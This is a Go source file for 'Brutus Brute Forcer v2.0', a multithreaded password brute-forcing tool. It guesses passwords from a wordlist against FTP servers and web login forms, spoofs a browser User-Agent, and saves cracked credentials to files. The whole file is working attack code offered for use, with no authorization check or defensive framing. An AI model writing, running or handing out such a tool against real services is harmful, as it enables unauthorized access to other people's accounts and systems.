package main

import (
	"bufio"
	"bytes"
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const (
	// Colors for output
	red    = "\033[31m"
	green  = "\033[32m"
	yellow = "\033[33m"
	blue   = "\033[34m"
	reset  = "\033[0m"
	// FTP Response Codes
	FtpReadyForNewUser  = 220
	FtpNeedPassword     = 331
	FtpLoginSuccess     = 230
	FtpNotLoggedIn      = 530
	FtpConnectionClosed = 421
)

// Initialize logger
var logger *log.Logger

func init() {
	file, err := os.OpenFile("app.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Fatal(err)
	}
	logger = log.New(file, "INFO: ", log.Ldate|log.Ltime|log.Lshortfile)
}

// Setup command line flags
func setupFlags() (flags struct {
	ftpTarget string
	webTarget string
	username  string
	wordlist  string
	threads   int
	rateLimit int
	verbose   bool
}) {
	flag.StringVar(&flags.ftpTarget, "ftp", "", "Specify the target FTP server as IP:port (e.g., 192.168.1.1:21)")
	flag.StringVar(&flags.webTarget, "web", "", "Specify the target URL for webpage brute force")
	flag.StringVar(&flags.username, "username", "", "Username for login attempts")
	flag.StringVar(&flags.wordlist, "wordlist", "", "Path to the password wordlist file")
	flag.IntVar(&flags.threads, "threads", 10, "Number of concurrent threads")
	flag.IntVar(&flags.rateLimit, "rate", 20, "Rate limit for login attempts per second (default is 20)")
	flag.BoolVar(&flags.verbose, "verbose", false, "Enable verbose output")

	flag.Usage = func() {
		fmt.Println("===================================")
		fmt.Println("       Brutus Brute Forcer v2.0      ")
		fmt.Println("===================================")
		flag.PrintDefaults()
	}

	flag.Parse()

	// Validate flags
	if flags.ftpTarget == "" && flags.webTarget == "" {
		fmt.Println("Error: At least one of -ftp or -web must be specified")
		flag.Usage()
		os.Exit(1)
	}

	if flags.username == "" {
		fmt.Println("Error: Username must be specified")
		flag.Usage()
		os.Exit(1)
	}

	if flags.wordlist == "" {
		fmt.Println("Error: Wordlist path must be specified")
		flag.Usage()
		os.Exit(1)
	}

	// Validate wordlist file exists
	if _, err := os.Stat(flags.wordlist); os.IsNotExist(err) {
		fmt.Printf("Error: Wordlist file not found: %s\n", flags.wordlist)
		os.Exit(1)
	}

	return flags
}

// RateLimiter struct to control the rate of login attempts
type RateLimiter struct {
	target string
	rate   int
	last   time.Time
	mu     sync.Mutex
}

// NewRateLimiter creates a new RateLimiter
func NewRateLimiter(target string, rate int) *RateLimiter {
	return &RateLimiter{
		target: target,
		rate:   rate,
		last:   time.Now(),
	}
}

// Wait enforces the rate limit
func (r *RateLimiter) Wait() {
	r.mu.Lock()
	defer r.mu.Unlock()

	now := time.Now()
	elapsed := now.Sub(r.last)
	if minTime := time.Second / time.Duration(r.rate); elapsed < minTime {
		time.Sleep(minTime - elapsed)
	}
	r.last = time.Now()
}

// Result structure to handle both FTP and Web results
type Result struct {
	Username   string
	Password   string
	Success    bool
	StatusCode int
	Error      error
	Service    string
}

// Stats structure to track attack statistics
type Stats struct {
	StartTime time.Time
	Attempts  int
	Successes int
	Failures  int
	mu        sync.Mutex
}

func (s *Stats) increment(success bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.Attempts++
	if success {
		s.Successes++
	} else {
		s.Failures++
	}
}

func (s *Stats) print() {
	duration := time.Since(s.StartTime)
	fmt.Printf("\n%sAttack Statistics:%s\n", yellow, reset)
	fmt.Printf("Duration: %v\n", duration)
	fmt.Printf("Total Attempts: %d\n", s.Attempts)
	fmt.Printf("Successful: %d\n", s.Successes)
	fmt.Printf("Failed: %d\n", s.Failures)
	fmt.Printf("Attempts per second: %.2f\n", float64(s.Attempts)/duration.Seconds())
}

func getFTPStatusDescription(code int) string {
	switch code {
	case FtpReadyForNewUser:
		return "Service ready"
	case FtpNeedPassword:
		return "Username accepted"
	case FtpLoginSuccess:
		return "Login successful"
	case FtpNotLoggedIn:
		return "Authentication failed"
	case FtpConnectionClosed:
		return "Connection closed"
	default:
		return "Unknown status"
	}
}

func attemptFTPLogin(ctx context.Context, address, username, password string) Result {
	result := Result{
		Username: username,
		Password: password,
		Service:  "FTP",
	}
	conn, err := net.DialTimeout("tcp", address, 5*time.Second)
	if err != nil {
		result.Error = err
		return result
	}
	defer conn.Close()

	// Set read timeout
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// Read initial response
	response, err := readFTPResponse(conn)
	if err != nil {
		result.Error = err
		return result
	}

	result.StatusCode = FtpReadyForNewUser
	if !strings.HasPrefix(response, fmt.Sprintf("%d", FtpReadyForNewUser)) {
		result.Error = fmt.Errorf("unexpected initial response: %s", response)
		return result
	}

	// Send username
	fmt.Fprintf(conn, "USER %s\r\n", username)
	response, err = readFTPResponse(conn)
	if err != nil {
		result.Error = err
		return result
	}

	result.StatusCode = FtpNeedPassword
	if !strings.HasPrefix(response, fmt.Sprintf("%d", FtpNeedPassword)) {
		result.Error = fmt.Errorf("username not accepted: %s", response)
		return result
	}

	// Send password
	fmt.Fprintf(conn, "PASS %s\r\n", password)
	response, err = readFTPResponse(conn)
	if err != nil {
		result.Error = err
		return result
	}

	if strings.HasPrefix(response, fmt.Sprintf("%d", FtpLoginSuccess)) {
		result.Success = true
		result.StatusCode = FtpLoginSuccess
	} else if strings.HasPrefix(response, fmt.Sprintf("%d", FtpNotLoggedIn)) {
		result.Success = false
		result.StatusCode = FtpNotLoggedIn
	} else {
		result.Error = fmt.Errorf("unexpected response: %s", response)
	}

	return result
}

func readFTPResponse(conn net.Conn) (string, error) {
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		return "", err
	}
	return string(buffer[:n]), nil
}

func attemptWebpageLogin(ctx context.Context, url, username, password string) Result {
	result := Result{
		Username: username,
		Password: password,
		Service:  "Web",
	}
	data := fmt.Sprintf("username=%s&password=%s", username, password)
	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewBufferString(data))
	if err != nil {
		result.Error = err
		return result
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil // Allow redirects
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		result.Error = err
		return result
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		result.Error = err
		return result
	}

	result.StatusCode = resp.StatusCode
	// You might want to customize these success conditions based on the target website
	result.Success = strings.Contains(string(body), "Login successful") ||
		strings.Contains(string(body), "Welcome") ||
		strings.Contains(string(body), "Dashboard") ||
		resp.StatusCode == 302 // Successful redirect after login

	return result
}

// Read lines from a file
func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// Main function
func main() {
	flags := setupFlags()

	passwords, err := readLines(flags.wordlist)
	if err != nil {
		logger.Printf("Error reading passwords from %s: %v", flags.wordlist, err)
		fmt.Printf("%sError reading passwords: %v%s\n", red, err, reset)
		return
	}

	stats := &Stats{StartTime: time.Now()}
	jobs := make(chan string, len(passwords))
	results := make(chan Result, len(passwords))
	var wg sync.WaitGroup

	// Create rate limiters for each target
	var ftpLimiter, webLimiter *RateLimiter
	if flags.ftpTarget != "" {
		ftpLimiter = NewRateLimiter(flags.ftpTarget, flags.rateLimit)
	}
	if flags.webTarget != "" {
		webLimiter = NewRateLimiter(flags.webTarget, flags.rateLimit)
	}

	for i := 0; i < flags.threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for password := range jobs {
				ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
				var result Result

				if flags.webTarget != "" {
					webLimiter.Wait()
					result = attemptWebpageLogin(ctx, flags.webTarget, flags.username, password)
				} else if flags.ftpTarget != "" {
					ftpLimiter.Wait()
					result = attemptFTPLogin(ctx, flags.ftpTarget, flags.username, password)
				}

				results <- result
				cancel()
			}
		}()
	}

	// Send passwords to workers
	go func() {
		for _, password := range passwords {
			jobs <- password
		}
		close(jobs)
	}()

	// Wait for completion in a separate goroutine
	go func() {
		wg.Wait()
		close(results)
	}()

	// Process results
	fmt.Printf("\n%sStarting attack with username: %s%s\n\n", blue, flags.username, reset)

	outputFile, err := os.Create("successful_logins.txt")
	if err != nil {
		logger.Printf("Warning: Could not create output file: %v", err)
		fmt.Printf("%sWarning: Could not create output file: %v%s\n", yellow, err, reset)
	}
	defer outputFile.Close()

	for result := range results {
		if result.Error != nil {
			if flags.verbose {
				logger.Printf("Error: %s:%s - %v", result.Username, result.Password, result.Error)
				fmt.Printf("%sError: %s:%s - %v%s\n", yellow, result.Username, result.Password, result.Error, reset)
			}
			stats.increment(false)
			continue
		}

		if result.Success {
			successMsg := fmt.Sprintf("Success: %s:%s [%d - %s]\n",
				result.Username, result.Password, result.StatusCode,
				getFTPStatusDescription(result.StatusCode))
			logger.Print(successMsg)
			fmt.Printf("%s%s%s", green, successMsg, reset)
			outputFile.WriteString(successMsg)
			stats.increment(true)
		} else {
			stats.increment(false)
			if flags.verbose {
				logger.Printf("Failed: %s:%s [%d]", result.Username, result.Password, result.StatusCode)
				fmt.Printf("%sFailed: %s:%s [%d]%s\n", red, result.Username, result.Password, result.StatusCode, reset)
			}
		}
	}

	// Print final statistics
	stats.print()
}

func updateBrutus() {
	cmd := exec.Command("git", "pull")
	cmd.Dir = "./" // Set the directory to your project path
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Error updating Brutus: %v\n", err)
		return
	}
	fmt.Println("Brutus has been updated to the latest version.")
}
